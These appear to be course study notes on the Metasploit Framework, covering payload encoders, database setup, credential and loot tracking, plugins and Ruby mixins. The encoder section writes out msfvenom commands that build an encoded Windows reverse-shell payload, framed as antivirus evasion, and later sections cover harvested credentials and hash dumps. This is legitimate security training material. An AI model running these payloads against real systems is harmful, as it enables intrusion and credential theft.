## Encoders

Payloads assist with making payloads compatible with different processor architecture and antivirus evasion, it plays the role of changing the payload to run on different operating systems and architectures, they are also needed to remove hexadecimal opcodes known as bad characters.

### Selecting an Encoder

Generating encoded payload before 2015:
```shell-session
$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

After 2015 (without encoding):
```shell-session
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

After 2015 (with encoding):
```shell-session
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai [-i <number>] # i is for number of iterations
```

If we want to use encoders from within msfconsole we can use the `show encoders`.

Metasploit has a tool that we can use with API key to analyze our payloads, it requires free registrations on VirusTotal:
```shell-session
$ msf-virustotal -k <API key> -f <file>
```

## Databases

Msfconsole has a built-in support for the PostgreSQL database, which helps to keep track of results and organize results, we can also import and export the results in conjunction with third-party tools, it is also possible to use the existing findings from database entries to configure exploit module parameters.

### Setting up the Database

Make sure PostgreSQL is running:
```shell-session
$ sudo service postgresql status
```

Start the PostgreSQL server:
```shell-session
$ sudo systemctl start postgresql
```

Initialize the MSF database:
```shell-session
$ sudo msfdb init
```

If we get an error we can try `apt update` to update Metasploit.

Checking the status of the database:
```shell-session
$ sudo msfdb status
```

Connect to the initiated database:
```shell-session
$ sudo msfdb run
```

In case we already have database configured and can't change the password:
```shell-session
$ msfdb reinit
$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
$ sudo service postgresql restart
$ msfconsole -q
```

Get overview of interacting with the database:
```shell-session
msf6 > help database

msf6 > db_status
```

### Using the Database

#### Workspaces

Workspaces are like folders to segregate the different scan results, host, and extracted information by IP, subnet, network, or domain.

View current workspace list, use `-a` to add, `-d` to delete:
```shell-session
msf6 > workspace
```

### Importing Scan results

Importing scan result, `.xml` file is preferred:
```shell-session
msf6 > db_import Target.xml
```

Check the presence of the host's information, `hosts` can be used too:
```shell-session
msf6 > services
```

### Using Nmap Inside MSFconsole
```shell-session
msf6 > db_nmap -sV -sS <ip address>
```

### Data Backup
```shell-session
msf6 > db_export -f xml backup.xml
```

### Hosts

Host can be automatically added, for example with scans or plugins, they can also be manually added, and we can organize the format and structure of the table, add comments, change existing information, and more.

### Services

Acts the same as the host command but with services discovered.

### Credentials

With the `creds` command we can visualize the credentials gathered during the interaction with the target host, add new credentials, match existing credentials with port specifications, add descriptions, etc.

```shell-session
msf6 > creds -h
```

### Loot

The `loot` command offers at glance list of owned services and users, it refers to the hash dumps from different system types, namely hashes, passwd, shadow, and more.

```shell-session
msf6 > loot -h
```

## Plugins

Plugins can be commercial with community edition or developed by individuals, whose given permission to the creators of Metasploit to use their product.

With plugins everything is documented directly to the database, services and vulnerabilities are made available at-a-glance for the user, the [plugins](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin) work directly with the API and can be used to manipulate the entire framework, they can be useful for automation, adding new commands to the `msfconsole`, and extending the already powerful framework.

### Using Plugins

`/usr/share/metasploit-framework/plugins` is the default directory for plugins.

#### Example of loading a plugin
```shell-session
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus


msf6 > nessus_help
```

### Installing new Plugins

To install new plugins we can simply copy the `.rb` files of the plugin to the plugins directory.

### Popular Plugins
|   |   |   |
|---|---|---|
|[nMap (pre-installed)](https://nmap.org)|[NexPose (pre-installed)](https://sectools.org/tool/nexpose/)|[Nessus (pre-installed)](https://www.tenable.com/products/nessus)|
|[Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)|[Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)|[Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation)|
|[Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)|[Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)|[Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)|

## Mixins

The Metasploit Framework is written in Ruby, an object-oriented programming language. Mixins offer flexibility to both the creator of the script and the user.

Mixins are classes that act as method for use by other classes without inheritance involved but rather inclusion. They are mainly used when we:

1. Want to provide a lot of optional features for a class.
2. Want to use one particular feature for a multitude of classes.

Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word `include`, to which we pass the name of the module as a `parameter`. We can read more about mixins [here](https://en.wikibooks.org/wiki/Metasploit/UsingMixins).